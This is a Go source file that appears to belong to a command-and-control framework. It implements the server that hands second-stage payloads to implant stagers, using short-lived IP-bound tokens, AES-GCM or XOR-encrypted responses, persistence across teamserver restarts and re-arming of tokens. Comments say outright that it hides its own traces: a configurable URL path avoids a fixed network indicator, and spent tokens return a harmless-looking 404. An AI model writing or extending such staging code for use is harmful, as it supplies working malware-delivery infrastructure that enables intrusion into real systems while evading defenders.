// Package stage implements Type4 delivery (plan §2.5): short-lived fetch
// tokens bound optionally to the requesting IP; two renderings on the same
// endpoint — JSON+AES-GCM (Go/Rust stagers) and ?raw=1 XOR (C stagers).
//
// Tokens carry a per-payload TTL and fetch allowance, survive a teamserver
// restart (metadata + bundle are persisted 0600 under data/stage), and can be
// re-armed without rebuilding the delivered artifact because the artifact
// already embeds the token.
package stage

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"wispp/protocol"
)

type item struct {
	data    []byte
	exp     time.Time
	bind    string
	left    int
	total   int
	created time.Time
}

// Status is the operator-facing view of one stage token.
type Status struct {
	Until     time.Time `json:"until"`
	Remaining int       `json:"remaining"`
	Total     int       `json:"total"`
}

type Service struct {
	mu        sync.Mutex
	items     map[string]*item
	TTL       time.Duration
	Uses      int
	Retention time.Duration // how long expired bundles stay on disk for re-arm
	Path      string        // HTTP prefix, default /stage (see -stage-path)
	dir       string
	nowFunc   func() time.Time
}

func New(ttl time.Duration) *Service {
	if ttl <= 0 {
		ttl = 60 * time.Minute
	}
	return &Service{
		items:     make(map[string]*item),
		TTL:       ttl,
		Uses:      1,
		Retention: 7 * 24 * time.Hour,
		Path:      "/stage",
		nowFunc:   time.Now,
	}
}

// SetPath changes the HTTP prefix used for stage fetches. A neutral prefix
// keeps /stage from becoming a fixed network IOC.
func (s *Service) SetPath(p string) error {
	p = strings.TrimSpace(p)
	if !strings.HasPrefix(p, "/") {
		p = "/" + p
	}
	p = strings.TrimRight(p, "/")
	if p == "" || strings.ContainsAny(p, "?# 	") {
		return errors.New("stage: bad path")
	}
	s.mu.Lock()
	s.Path = p
	s.mu.Unlock()
	return nil
}

// NewToken returns a fresh 16-byte hex stage token.
func NewToken() (string, error) {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func validToken(token string) bool {
	if len(token) < 16 || len(token) > 64 {
		return false
	}
	_, err := hex.DecodeString(token)
	return err == nil
}

// Persist points the service at a directory and restores previously issued
// bundles, so downloaded staged payloads keep working across restarts.
func (s *Service) Persist(dir string) error {
	if dir == "" {
		return nil
	}
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return err
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.dir = dir
	for _, e := range entries {
		name := e.Name()
		if e.IsDir() || !strings.HasSuffix(name, ".json") {
			continue
		}
		token := strings.TrimSuffix(name, ".json")
		if !validToken(token) {
			continue
		}
		mb, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			continue
		}
		var mf metaFile
		if json.Unmarshal(mb, &mf) != nil {
			continue
		}
		data, err := os.ReadFile(filepath.Join(dir, token+".bin"))
		if err != nil {
			continue
		}
		s.items[token] = &item{data: data, exp: mf.Exp, bind: mf.Bind,
			left: mf.Left, total: mf.Total, created: mf.Created}
	}
	s.gcLocked()
	return nil
}

// Issue stores stage2 bytes under a fresh token with the service defaults.
func (s *Service) Issue(data []byte, bind string) (string, error) {
	token, err := NewToken()
	if err != nil {
		return "", err
	}
	if err := s.IssueEx(token, data, bind, 0, 0); err != nil {
		return "", err
	}
	return token, nil
}

// IssueWithToken stores data under a caller-chosen token with the service
// defaults. The layered rust payload derives its artifact keys from the token,
// so it must be known before the bundle is built and uploaded.
func (s *Service) IssueWithToken(token string, data []byte, bind string) error {
	return s.IssueEx(token, data, bind, 0, 0)
}

// IssueEx stores data with an explicit TTL and fetch allowance (zero values
// pick the service defaults).
func (s *Service) IssueEx(token string, data []byte, bind string, ttl time.Duration, uses int) error {
	if !validToken(token) {
		return errors.New("stage: bad token")
	}
	if ttl <= 0 {
		ttl = s.TTL
	}
	if uses <= 0 {
		uses = s.Uses
	}
	now := s.nowFunc()
	it := &item{data: data, exp: now.Add(ttl), bind: bind, left: uses, total: uses, created: now}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.gcLocked()
	s.items[token] = it
	if s.dir != "" {
		s.writeDataLocked(token, it)
		s.saveMetaLocked(token, it)
	}
	return nil
}

// Status reports the live allowance for a token.
func (s *Service) Status(token string) (Status, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	it, ok := s.items[token]
	if !ok {
		return Status{}, false
	}
	return Status{Until: it.exp, Remaining: it.left, Total: it.total}, true
}

// Rearm resets an existing token's expiry and allowance. The delivered
// artifact embeds this token, so no re-download or rebind is needed.
func (s *Service) Rearm(token string, ttl time.Duration, uses int) (Status, error) {
	if ttl <= 0 {
		ttl = s.TTL
	}
	if uses <= 0 {
		uses = s.Uses
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	it, ok := s.items[token]
	if !ok {
		return Status{}, errors.New("stage: unknown token")
	}
	it.exp = s.nowFunc().Add(ttl)
	it.left = uses
	it.total = uses
	s.saveMetaLocked(token, it)
	return Status{Until: it.exp, Remaining: it.left, Total: it.total}, nil
}

// Revoke drops a token and its persisted bundle.
func (s *Service) Revoke(token string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.items, token)
	if s.dir != "" {
		_ = os.Remove(filepath.Join(s.dir, token+".json"))
		_ = os.Remove(filepath.Join(s.dir, token+".bin"))
	}
}

// ServeHTTP handles GET /stage/<token>[?raw=1]. A consumed/expired/unknown
// token must look identical to the outside world (benign 404).
// Active returns tokens that can still serve a fetch (unexpired, allowance left).
func (s *Service) Active() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	now := s.nowFunc()
	n := 0
	for _, it := range s.items {
		if !now.After(it.exp) && it.left > 0 {
			n++
		}
	}
	return n
}

func (s *Service) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	prefix := s.Path + "/"
	if !strings.HasPrefix(r.URL.Path, prefix) {
		http.NotFound(w, r)
		return
	}
	token := strings.TrimPrefix(r.URL.Path, prefix)
	if token == "" || strings.Contains(token, "/") {
		http.NotFound(w, r)
		return
	}
	s.mu.Lock()
	it, ok := s.items[token]
	if !ok || s.nowFunc().After(it.exp) || it.left <= 0 || (it.bind != "" && it.bind != clientIP(r)) {
		s.mu.Unlock()
		http.NotFound(w, r)
		return
	}
	it.left-- // strictly one response per allowance
	s.saveMetaLocked(token, it)
	data := it.data
	s.mu.Unlock()

	if r.URL.Query().Get("b64") == "1" {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		_, _ = w.Write([]byte(base64.StdEncoding.EncodeToString(data)))
		return
	}
	if r.URL.Query().Get("raw") == "1" {
		w.Header().Set("Content-Type", "application/octet-stream")
		_, _ = w.Write(xor(data, key(token)))
		return
	}
	sealed, err := sealJSON(key(token), data)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_, _ = w.Write(sealed)
}

type metaFile struct {
	Exp     time.Time `json:"exp"`
	Bind    string    `json:"bind,omitempty"`
	Left    int       `json:"left"`
	Total   int       `json:"total"`
	Created time.Time `json:"created"`
}

func (s *Service) saveMetaLocked(token string, it *item) {
	if s.dir == "" {
		return
	}
	b, err := json.Marshal(metaFile{Exp: it.exp, Bind: it.bind, Left: it.left, Total: it.total, Created: it.created})
	if err != nil {
		return
	}
	path := filepath.Join(s.dir, token+".json")
	tmp := path + ".tmp"
	if os.WriteFile(tmp, b, 0o600) == nil {
		_ = os.Rename(tmp, path)
	}
}

func (s *Service) writeDataLocked(token string, it *item) {
	if s.dir == "" {
		return
	}
	path := filepath.Join(s.dir, token+".bin")
	tmp := path + ".tmp"
	if os.WriteFile(tmp, it.data, 0o600) == nil {
		_ = os.Rename(tmp, path)
	}
}

func key(token string) []byte {
	return protocol.StageDerivedKey(protocol.DomainStage, token)
}

// xor is the raw stream cipher for the ~2KB C stager path: keystream blocks
// are SHA-256 chains over the key.
func xor(data, k []byte) []byte {
	out := make([]byte, len(data))
	stream := sha256.Sum256(k)
	pos := 0
	for i := range data {
		if pos == len(stream) {
			stream = sha256.Sum256(append(append([]byte{}, stream[:]...), k...))
			pos = 0
		}
		out[i] = data[i] ^ stream[pos]
		pos++
	}
	return out
}

func sealJSON(k, data []byte) ([]byte, error) {
	block, err := aes.NewCipher(k)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	iv := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(iv); err != nil {
		return nil, err
	}
	ct := gcm.Seal(nil, iv, data, nil)
	return json.Marshal(map[string]any{
		"v": 2, "iv": base64.StdEncoding.EncodeToString(iv),
		"ct": base64.StdEncoding.EncodeToString(ct),
	})
}

func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		return strings.TrimSpace(strings.Split(xff, ",")[0])
	}
	if i := strings.LastIndex(r.RemoteAddr, ":"); i >= 0 {
		return r.RemoteAddr[:i]
	}
	return r.RemoteAddr
}

func (s *Service) gcLocked() {
	now := s.nowFunc()
	for k, it := range s.items {
		if it.exp.Add(s.Retention).Before(now) {
			delete(s.items, k)
			if s.dir != "" {
				_ = os.Remove(filepath.Join(s.dir, k+".json"))
				_ = os.Remove(filepath.Join(s.dir, k+".bin"))
			}
		}
	}
}
